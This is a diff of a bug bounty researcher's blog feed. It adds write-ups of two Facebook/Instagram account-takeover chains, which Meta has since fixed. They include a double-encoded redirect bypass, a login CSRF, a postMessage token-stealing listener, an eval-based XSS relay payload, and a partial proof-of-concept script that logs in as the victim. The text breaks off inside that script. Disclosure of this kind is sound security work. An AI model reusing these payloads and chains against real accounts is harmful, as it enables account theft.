@@ -1,4 +1,751 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-01-14T18:37:43+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Youssef Sammouda (sam0) personal blog</title><subtitle>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</subtitle><entry><title type="html">Multiple XSS in Meta Conversion API Gateway Leading to Zero-Click Account Takeover</title><link href="http://localhost:4000/uncategorized/2025/01/13/capig-xss.html" rel="alternate" type="text/html" title="Multiple XSS in Meta Conversion API Gateway Leading to Zero-Click Account Takeover" /><published>2025-01-13T14:04:43+02:00</published><updated>2025-01-13T14:04:43+02:00</updated><id>http://localhost:4000/uncategorized/2025/01/13/capig-xss</id><content type="html" xml:base="http://localhost:4000/uncategorized/2025/01/13/capig-xss.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-01-15T14:27:40+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Youssef Sammouda (sam0) personal blog</title><subtitle>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</subtitle><entry><title type="html">Two-click Facebook account takeover via FXAuth token and blob theft</title><link href="http://localhost:4000/uncategorized/2025/01/15/steal-fxauth-leads-instagram-ato.html" rel="alternate" type="text/html" title="Two-click Facebook account takeover via FXAuth token and blob theft" /><published>2025-01-15T00:00:00+02:00</published><updated>2025-01-15T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2025/01/15/steal-fxauth-leads-instagram-ato</id><content type="html" xml:base="http://localhost:4000/uncategorized/2025/01/15/steal-fxauth-leads-instagram-ato.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<hr />
+<p><br />
+Facebook and Instagram accounts are deeply integrated through Accounts Center, allowing users to link identities, share authentication methods, and manage security settings across platforms.</p>
+
+<p>This integration relies on native SSO flows, FXAuth tokens, and redirect-based handoffs between Facebook and Instagram <code class="language-plaintext highlighter-rouge">accountscenter</code> domains. When these components are not strictly isolated, a single leaked token can be replayed across platforms and escalate into full account compromise.</p>
+
+<p>This report describes a complete attack chain that allows an attacker to link a victim’s Facebook account to the attacker’s Instagram account and gain persistent access.</p>
+
+<h2 id="high-level-impact">High-Level Impact</h2>
+<hr />
+<p><br />
+After successful exploitation, the attacker can:</p>
+
+<ul>
+  <li>Link the victim’s Facebook account to the attacker’s Instagram account</li>
+  <li>Control Facebook account settings through Accounts Center</li>
+  <li>Potentially authenticate into Facebook using Instagram login (mobile)</li>
+  <li>Maintain long-term access without Facebook credentials or 2FA</li>
+</ul>
+
+<h2 id="descrption">Descrption</h2>
+<hr />
+<h3 id="accounts-center-native-sso-endpoint">Accounts Center Native SSO Endpoint</h3>
+
+<p>The vulnerability originates from the endpoint <code class="language-plaintext highlighter-rouge">https://www.facebook.com/login/native_sso/</code>. This endpoint is used for cross-app authentication and accepts several parameters, including:</p>
+
+<ul>
+  <li>app_id</li>
+  <li>token (FXAuth token to be signed)</li>
+  <li>extra_data (redirect path)</li>
+</ul>
+
+<p>The <code class="language-plaintext highlighter-rouge">extra_data</code> parameter is validated based on the calling application.</p>
+
+<p>For the Instagram application (app_id = <code class="language-plaintext highlighter-rouge">1217981644879628</code>), Facebook historically allowed any redirect path starting with <code class="language-plaintext highlighter-rouge">/accounts_center/</code>. This behavior existed before <code class="language-plaintext highlighter-rouge">accountscenter.instagram.com</code> was introduced.</p>
+
+<p>By abusing double url encoded characters and path traversal, it is possible to escape the intended <code class="language-plaintext highlighter-rouge">/accounts_center/</code> prefix and redirect to any other endpoints while still passing validation.</p>
+
+<p>The following crafted URL demonstrates the bypass:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/login/native_sso/?
+<span class="err">&amp;</span>flow=fbcal
+<span class="err">&amp;</span>app_id=1217981644879628
+<span class="err">&amp;</span>token=FXAUTH_TOKEN
+<span class="err">&amp;</span>custom_content_config=accounts_center
+<span class="err">&amp;</span>extra_data=/accounts_center/%252%0DE%252%0DE\%252%0DE%252%0DE\/%252%0DE%252%0DE\%252%0DE%252%0DE\any_endpoint
+</code></pre></div></div>
+<p>After user confirmation, the flow redirects to https://www.instagram.com/any_endpoint</p>
+
+<h3 id="redirect-endpoint--billing_interfacesexternal_result">Redirect endpoint : /billing_interfaces/external_result</h3>
+
+<p>The native SSO flow now could redirect to any endpoint in <code class="language-plaintext highlighter-rouge">www.instagram.com</code>, i managed to find this particular endpoint:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/billing_interfaces/external_result/?
+<span class="err">&amp;</span>token=TOKEN
+<span class="err">&amp;</span>blob=BLOB
+</code></pre></div></div>
+
+<p>This endpoint would try to communicate with its <code class="language-plaintext highlighter-rouge">opener</code> and <code class="language-plaintext highlighter-rouge">parent</code> windows using <code class="language-plaintext highlighter-rouge">postMessage</code> with target origin set to <code class="language-plaintext highlighter-rouge">*</code>. Normally, only limited data is sent. However, when a valid <code class="language-plaintext highlighter-rouge">nonce</code> parameter is added to the endpoint, it would send the <strong>entire URL</strong>, leaking sensitive parameters including:</p>
+
+<ul>
+  <li>token</li>
+  <li>blob</li>
+</ul>
+
+<p>This behavior enables token exfiltration. The <code class="language-plaintext highlighter-rouge">nonce</code> however cannot be guessed and must be generated legitimately for a specific Instagram user. This means that we will need to generate a <code class="language-plaintext highlighter-rouge">nonce</code> for the attacker Instagram account, then force login the instagram account inside the victim’s browser.</p>
+
+<h2 id="attack-flow-summary">Attack Flow Summary</h2>
+
+<hr />
+<h3 id="preparation">Preparation</h3>
+
+<h4 id="i---generating-a-valid-nonce-for-the-endpoint">I - Generating a valid nonce for the endpoint</h4>
+<hr />
+<p><br />
+Using an attacker-controlled Instagram account:</p>
+
+<p>1) Visit <code class="language-plaintext highlighter-rouge">https://www.instagram.com/ad_tools/</code></p>
+
+<p>2) Click “Add funds” or “Payment Settings”</p>
+
+<p>3) Capture a request containing an <code class="language-plaintext highlighter-rouge">access_token</code>, to either:</p>
+<ul>
+  <li>facebook.com/auth/token</li>
+  <li>graph.facebook.com</li>
+</ul>
+
+<p>4) Use the access token to call the following GraphQL mutation:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.facebook.com/graphql/?
+<span class="err">&amp;</span>locale=en_US
+<span class="err">&amp;</span>access_token=ACCESS_TOKEN
+<span class="err">&amp;</span>variables={
+  "input": {
+    "country": "US",
+    "establish_type": "INIT",
+    "logging_data": {
+      "logging_counter": 41,
+      "logging_id": "3790958217"
+    },
+    "payment_account_id": "PAYMENT_ACCOUNT_ID",
+    "upl_logging_data": {},
+    "actor_id": "1",
+    "client_mutation_id": "16"
+  }
+}
+<span class="err">&amp;</span>server_timestamps=true
+<span class="err">&amp;</span>doc_id=8354858754606667
+<span class="err">&amp;</span>method=post
+</code></pre></div></div>
+
+<p>Where <code class="language-plaintext highlighter-rouge">PAYMENT_ACCOUNT_ID</code> is obtained from the url:</p>
+
+<p><code class="language-plaintext highlighter-rouge">https://business.facebook.com/billing_hub/payment_settings/?asset_id=PAYMENT_ACCOUNT_ID</code></p>
+
+<p>The response contains a valid nonce value, for example: <code class="language-plaintext highlighter-rouge">hwFlRFhb3krN0rprx16bYLQ2FQ9bpJei</code></p>
+
+<h4 id="ii---instagram-login-csrf">II - Instagram Login CSRF</h4>
+<hr />
+<p><br />
+This can be achieved using Instagram’s email-based login flow. When a user initiates a password reset on Instagram, they receive an email titled:</p>
+
+<p><code class="language-plaintext highlighter-rouge">We’ve made it easy to get back on Instagram</code></p>
+
+<p>The email contains a “Login as USERNAME” link pointing to:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/_n/web_emaillogin?
+<span class="err">&amp;</span>uid=ENCODED_UID
+<span class="err">&amp;</span>token=LOGIN_NONCE
+<span class="err">&amp;</span>auto_send=0
+</code></pre></div></div>
+<p>Visiting this URL automatically authenticates you in the browser and sets Instagram session cookies without requiring any further interaction. This endpoint acts as a login CSRF primitive.</p>
+
+<h4 id="iii---generating-an-fxauth-token-to-be-signed">III - Generating an FXAuth Token to be signed</h4>
+<hr />
+<p><br />
+The FXAuth token that we will use in this attack needs to be initially generated by the attacker, sent to the victim in the exploit, then use the received <code class="language-plaintext highlighter-rouge">token</code> and <code class="language-plaintext highlighter-rouge">blob</code> , which will be linked to the initial token, to finalize the linking process with the attacker account:</p>
+
+<p>As the attacker:</p>
+
+<p>1) Visit <code class="language-plaintext highlighter-rouge">https://accountscenter.instagram.com/profiles/</code></p>
+
+<p>2) Click “Add account”</p>
+
+<p>3) You get redirected to:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   https://www.facebook.com/login/native_sso/?
+   <span class="err">&amp;</span>flow=fbcalcomettest
+   <span class="err">&amp;</span>app_id=1217981644879628
+   <span class="err">&amp;</span>token=FXAUTH_TOKEN
+   <span class="err">&amp;</span>extra_data=%2Fadd%2F%3Fbackground_page%3D%252Fprofiles%252F<span class="err">&amp;</span>custom_content_config=accounts_center
+</code></pre></div></div>
+<p>4) Extract the <code class="language-plaintext highlighter-rouge">token</code> parameter value and close the page without further interaction.
+<br /></p>
+
+<hr />
+<h3 id="attack">Attack</h3>
+<p>0) Victim visits attackers website</p>
+
+<p>1) The attacker force the victim to login the his Instagram account by loading the Instagram login CSRF URL:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   https://www.instagram.com/_n/web_emaillogin?
+   <span class="err">&amp;</span>uid=ENC_UID
+   <span class="err">&amp;</span>token=LOGIN_NONCE
+   <span class="err">&amp;</span>auto_send=0
+</code></pre></div></div>
+
+<p>2) After detecting the login, the attacker’s script opens a new window with the crafted Native SSO URL:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/login/native_sso/?
+<span class="err">&amp;</span>flow=fbcal
+<span class="err">&amp;</span>app_id=1217981644879628
+<span class="err">&amp;</span>token=FXAUTH_TOKEN
+<span class="err">&amp;</span>custom_content_config=accounts_center
+<span class="err">&amp;</span>extra_data=/accounts_center/%252%0DE%252%0DE\%252%0DE%252%0DE\/%252%0DE%252%0DE\%252%0DE%252%0DE\billing_interfaces\external_result?nonce=ATTACKER_NONCE
+</code></pre></div></div>
+
+<p>3) Victim confirms usage of Instagram app</p>
+
+<p>4) The endpoint redirects back to <code class="language-plaintext highlighter-rouge">https://business.facebook.com/billing_interfaces/external_result/?blob=VICTIM_BLOB&amp;token=VICTIM_TOKEN&amp;nonce=ATTACKER_NONCE</code>.</p>
+
+<p>5) The endpoint sends a message via <code class="language-plaintext highlighter-rouge">postMessage</code> to the <code class="language-plaintext highlighter-rouge">opener</code> window containing the full redirect URL</p>
+
+<p>6) The attacker captures the message and extracts blob and token using this example listener</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nf">log_data</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">direct_debit_redirect_url</span><span class="p">);</span>
+<span class="p">};</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>7) Using the stolen victim’s <code class="language-plaintext highlighter-rouge">blob</code> and <code class="language-plaintext highlighter-rouge">token</code>, the attacker later navigates to:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.instagram.com/add/?
+<span class="err">&amp;</span>background_page=%2Fprofiles%2F
+<span class="err">&amp;</span>blob=BLOB
+<span class="err">&amp;</span>token=TOKEN
+<span class="err">&amp;</span>auth_flow=linking
+
+</code></pre></div></div>
+<p>The victim’s Facebook account gets linked to the attacker’s Instagram account. At this point, the attacker gains control through Accounts Center and can manage settings or authenticate via Instagram.</p>
+
+<h2 id="impact">Impact</h2>
+<hr />
+<p><br />
+This vulnerability enables cross-platform account takeover by chaining:</p>
+
+<ul>
+  <li>FXAuth token reuse</li>
+  <li>Weak redirect validation in native SSO</li>
+  <li>Token leakage via postMessage</li>
+  <li>Email-based Instagram login CSRF</li>
+</ul>
+
+<p>The result is persistent Facebook account compromise without passwords or 2FA.</p>
+
+<h2 id="timeline">Timeline</h2>
+<hr />
+<p><br />
+Oct 16, 2024 — Bug reported</p>
+
+<p>Oct 30, 2024 — Bug Acknowledged by Facebook</p>
+
+<p>Nov 5, 2024 — Bug Fixed by Facebook</p>
+
+<p>Nov 27, 2024 — <strong>$30,000</strong> bounty awarded by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction Facebook and Instagram accounts are deeply integrated through Accounts Center, allowing users to link identities, share authentication methods, and manage security settings across platforms.]]></summary></entry><entry><title type="html">Self-XSS in Facebook payments flow Leading to Instagram and Facebook account takeover</title><link href="http://localhost:4000/uncategorized/2025/01/15/self-xss-facebook-payments.html" rel="alternate" type="text/html" title="Self-XSS in Facebook payments flow Leading to Instagram and Facebook account takeover" /><published>2025-01-15T00:00:00+02:00</published><updated>2025-01-15T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2025/01/15/self-xss-facebook-payments</id><content type="html" xml:base="http://localhost:4000/uncategorized/2025/01/15/self-xss-facebook-payments.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<hr />
+<p><br />
+Facebook’s payments and billing flows rely heavily on third-party financial service providers.<br />
+To facilitate bank-based payments, Facebook embeds external services inside privileged Facebook pages and allows cross-window communication between those services and <code class="language-plaintext highlighter-rouge">facebook.com</code>.</p>
+
+<p>One such integration exists in the <strong>ACH Direct Debit initialization flow</strong>, which embeds <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> inside an iframe on <code class="language-plaintext highlighter-rouge">m.facebook.com</code>.<br />
+This integration assumes that messages originating from <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> are trustworthy and safe to process.</p>
+
+<p>That assumption turned out to be incorrect. A cross-window message handler on <code class="language-plaintext highlighter-rouge">m.facebook.com</code> accepts specific message types from <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> and <strong>directly injects attacker-controlled HTML into the DOM</strong>.<br />
+By chaining this behavior with a cross-site scripting vulnerability in <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code>, it becomes possible to achieve <strong>JavaScript execution in the context of <code class="language-plaintext highlighter-rouge">facebook.com</code></strong>.</p>
+
+<p>Once code execution is achieved on Facebook, the attack can be escalated to <strong>Instagram account takeover</strong> through existing OAuth flows.</p>
+
+<h2 id="description">Description</h2>
+<hr />
+<h3 id="payments">Payments</h3>
+
+<p>The vulnerable Facebook page is <code class="language-plaintext highlighter-rouge">https://m.facebook.com/billing_interfaces/direct_debit_ach_initialization</code></p>
+
+<p>This endpoint:</p>
+
+<ul>
+  <li>Embeds an iframe pointing to <code class="language-plaintext highlighter-rouge">https://ThirdPartyPaymentProvider.com</code></li>
+  <li>Registers a <code class="language-plaintext highlighter-rouge">message</code> event listener to receive cross-window messages</li>
+  <li>Enforces a strict origin check, only accepting messages from <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code></li>
+</ul>
+
+<p>At first glance, this seems secure.</p>
+
+<p>However, <strong>origin validation is only as strong as the security of the trusted origin</strong>.</p>
+
+<h3 id="trusting-thirdpartypaymentprovidercom-as-a-security-boundary">Trusting ThirdPartyPaymentProvider.com as a Security Boundary</h3>
+
+<p>The Facebook page registers a cross-window message handler similar to the following logic:</p>
+
+<ul>
+  <li>Accept messages only if <code class="language-plaintext highlighter-rouge">event.origin === "https://ThirdPartyPaymentProvider.com"</code></li>
+  <li>Parse the message contents</li>
+  <li>Handle specific message types</li>
+</ul>
+
+<p>One such accepted message type is:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ThirdPartyPaymentProvider.learnMore
+</code></pre></div></div>
+
+<p>When this message is received, its payload is <strong>unsafely injected into the DOM</strong> without sanitization.</p>
+
+<p>This creates a critical trust boundary:</p>
+
+<blockquote>
+  <p><strong>Any JavaScript execution inside ThirdPartyPaymentProvider.com can send arbitrary HTML to be rendered inside facebook.com</strong></p>
+</blockquote>
+
+<h3 id="xss-in-thirdpartypaymentprovidercom">XSS in ThirdPartyPaymentProvider.com</h3>
+
+<p><code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> loads a remote configuration file specified via URL parameters.</p>
+
+<p>By abusing this behavior, it was possible to inject the following payload into the ThirdPartyPaymentProvider context:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">""</span> <span class="na">onerror=</span><span class="s">"onmessage=(e)=&gt;{eval(e.data.cmd)};"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>This turns the <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider</code> iframe into a <strong>message relay</strong>, allowing arbitrary JavaScript commands to be executed inside that origin.</p>
+
+<p>At this point, the attacker controls a trusted <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> frame.</p>
+
+<h3 id="triggering-xss-in-facebookcom">Triggering XSS in facebook.com</h3>
+
+<p>Once the <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider</code> iframe is compromised, exploitation becomes trivial.</p>
+
+<p>From the parent window, the attacker sends a message to the compromised iframe:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">postMessage</span><span class="p">({</span>
+  <span class="na">cmd</span><span class="p">:</span> <span class="s2">`
+    top.frames[1].postMessage(
+      'ThirdPartyPaymentProvider.learnMore|&lt;img src="" onerror="alert(document.domain)"/&gt;|b|c|d',
+      '*'
+    )
+  `</span>
+<span class="p">},</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>The compromised <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider</code> iframe then forwards this message to the Facebook iframe.</p>
+
+<p>Because:</p>
+
+<ul>
+  <li>The origin is valid (<code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code>)</li>
+  <li>The message type is allowed (<code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.learnMore</code>)</li>
+</ul>
+
+<p>Facebook injects the supplied HTML directly into the page, resulting in:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JavaScript execution in the context of facebook.com
+</code></pre></div></div>
+
+<p>At this point, <code class="language-plaintext highlighter-rouge">document.domain</code> is <code class="language-plaintext highlighter-rouge">facebook.com</code>.</p>
+
+<h3 id="why-this-is-a-self-xss">Why this is a Self-XSS</h3>
+
+<p>Reaching the vulnerable Facebook endpoint requires two parameters:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">user_id</code></li>
+  <li><code class="language-plaintext highlighter-rouge">nonce</code></li>
+</ul>
+
+<p>The <code class="language-plaintext highlighter-rouge">nonce</code> is not guessable and must be generated server-side and it’s linked to the current logged-in user. To satisfy these conditions, the exploit chain begins with a <strong>login CSRF</strong>, forcing the victim to authenticate into the attacker’s Facebook account. Once logged in, the attacker can reuse their own valid nonce from another session to start the flow.</p>
+
+<h3 id="escalation-to-instagram-account-takeover">Escalation to Instagram Account Takeover</h3>
+
+<p>After achieving Javascript execution on <code class="language-plaintext highlighter-rouge">facebook.com</code>, escalation is straightforward. The attacker can initiate the Instagram OAuth flow:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/oauth/oidc/
+  ?app_id=532380490911317
+  &amp;redirect_uri=https://business.facebook.com/business/loginpage/igoauth/callback/
+  &amp;scope=openid,linking
+  &amp;response_type=code
+</code></pre></div></div>
+
+<p>When the flow redirects to:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>business.facebook.com/business/loginpage/igoauth/callback/
+</code></pre></div></div>
+
+<p>the page runs under the <code class="language-plaintext highlighter-rouge">facebook.com</code> domain.</p>
+
+<p>Because Javascript is already executing in this context, the attacker can read <code class="language-plaintext highlighter-rouge">location.href</code>, extract OAuth codes, and <strong>complete account linking or takeover</strong>.</p>
+
+<h3 id="attack-flow-summary">Attack Flow Summary</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1) Victim is forced to log into the attacker’s Facebook account via a login CSRF
+
+2) Attacker loads the ACH initialization page with a valid attacker `nonce` and `user_id`
+
+3) Facebook embeds `ThirdPartyPaymentProvider.com` inside a privileged iframe
+
+4) An XSS in `ThirdPartyPaymentProvider.com` allows attacker-controlled Javascript execution
+
+5) The compromised iframe sends a `ThirdPartyPaymentProvider.learnMore` message to parent window
+
+6) Facebook injects attacker-supplied HTML, triggering XSS on `facebook.com`
+
+7) Attacker initiates Instagram OAuth flow and steals an authorization code
+</code></pre></div></div>
+
+<h3 id="additional-impact-full-facebook-account-takeover-via-device-based-login-abuse">Additional Impact: Full Facebook Account Takeover via Device-Based Login Abuse</h3>
+
+<p>After further testing, it was possible to escalate the existing XSS into a <strong>full Facebook account takeover</strong>, not only Instagram or Workplace.</p>
+
+<p>This scenario abuses two Facebook behaviors that become reachable once JavaScript execution is achieved in the context of <code class="language-plaintext highlighter-rouge">facebook.com</code>:</p>
+<ul>
+  <li>The widespread usage of <strong>“Save Login” / device-based login</strong></li>
+  <li>The ability to keep a malicious page alive using a <strong>Blob URL</strong>, preventing Facebook from refreshing or invalidating the session</li>
+</ul>
+
+<h4 id="scenario-1-device-switch-abuse">Scenario 1: Device-Switch abuse</h4>
+
+<p>Most Facebook users have the <strong>Save Login</strong> feature enabled on at least one device. When this is the case, Facebook exposes <em>device-switchable accounts</em> through a GraphQL query. From the attacker account, after triggering the XSS:</p>
+
+<ul>
+  <li>A GraphQL query can be issued to fetch **device-switchable accounts **</li>
+  <li>Knowing the real victim account id, and if it’s saved, it’s possible to send a POST request to the device-based login endpoint</li>
+  <li>The login occurs without password, 2FA, or user interaction</li>
+</ul>
+
+<p>To ensure persistence, the XSS payload is loaded into a <strong>Blob URL</strong>, preventing Facebook from reloading or navigating away from the compromised execution context.</p>
+
+<h4 id="scenario-2-google-oauth-login">Scenario 2: Google OAuth login</h4>
+
+<p>If no device-switchable accounts are found, an alternative path still exists.</p>
+
+<p>The attacker can:</p>
+
+<ul>
+  <li>Trigger a Google OAuth flow via <code class="language-plaintext highlighter-rouge">accounts.google.com</code></li>
+  <li>Capture the authorization code after redirection to Facebook</li>
+  <li>Associate the Google login code with the victim <code class="language-plaintext highlighter-rouge">user_id</code> or <code class="language-plaintext highlighter-rouge">cuid</code></li>
+  <li>Retry authentication until Facebook offers <strong>“Continue with Google”</strong> as a fallback</li>
+</ul>
+
+<p>This technique works <strong>without user interaction</strong> if the victim is logged into <strong>only one Google account</strong> in their browser.</p>
+
+<h3 id="proof-of-concept">Proof of Concept</h3>
+
+<p>The following PoC was successfully tested and demonstrates both attack paths.<br />
+All execution occurs <strong>after XSS is already achieved</strong> in the Facebook context.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>code = `
+<span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;script&gt;</span>
+    <span class="kd">const</span> <span class="nx">getDeviceAccounts</span> <span class="o">=</span> <span class="p">(</span><span class="nx">attacker_dtsg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://m.facebook.com/api/graphql/</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
+          <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">,</span>
+        <span class="p">},</span>
+        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">body</span><span class="p">:</span> <span class="s2">`__a=1&amp;fb_dtsg=</span><span class="p">${</span><span class="nx">attacker_dtsg</span><span class="p">}</span><span class="s2">&amp;doc_id=3114557815333936&amp;variables={}`</span><span class="p">,</span>
+      <span class="p">})</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+          <span class="k">try</span> <span class="p">{</span>
+            <span class="kd">const</span> <span class="nx">post_data</span> <span class="o">=</span> <span class="nx">e</span>
+              <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login/device-based/login/","inputs":[</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+              <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">]</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+
+            <span class="kd">const</span> <span class="nx">data_json</span> <span class="o">=</span> <span class="p">{};</span>
+            <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="s2">`[</span><span class="p">${</span><span class="nx">post_data</span><span class="p">}</span><span class="s2">]`</span><span class="p">).</span><span class="nf">forEach</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+              <span class="nx">data_json</span><span class="p">[</span><span class="nx">e</span><span class="p">.</span><span class="nx">name</span><span class="p">]</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+            <span class="p">});</span>
+
+            <span class="k">return</span> <span class="nx">data_json</span><span class="p">;</span>
+          <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">"</span><span class="s2">No device switchable accounts found!</span><span class="dl">"</span><span class="p">);</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+          <span class="p">}</span>
+        <span class="p">});</span>
+    <span class="p">};</span>
+
+    <span class="kd">const</span> <span class="nx">loginAsVictim</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://m.facebook.com/login/device-based/login/</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">redirect</span><span class="p">:</span> <span class="dl">"</span><span class="s2">manual</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
+          <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">,</span>
+        <span class="p">},</span>
+        <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">body</span><span class="p">:</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nf">toString</span><span class="p">(),</span>
+      <span class="p">}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">());</span>
+    <span class="p">};</span>
+
+    <span class="kd">const</span> <span class="nx">getFirstPartyAccessToken</span> <span class="o">=</span> <span class="p">(</span><span class="nx">dtsg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://m.facebook.com/dialog/oauth</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
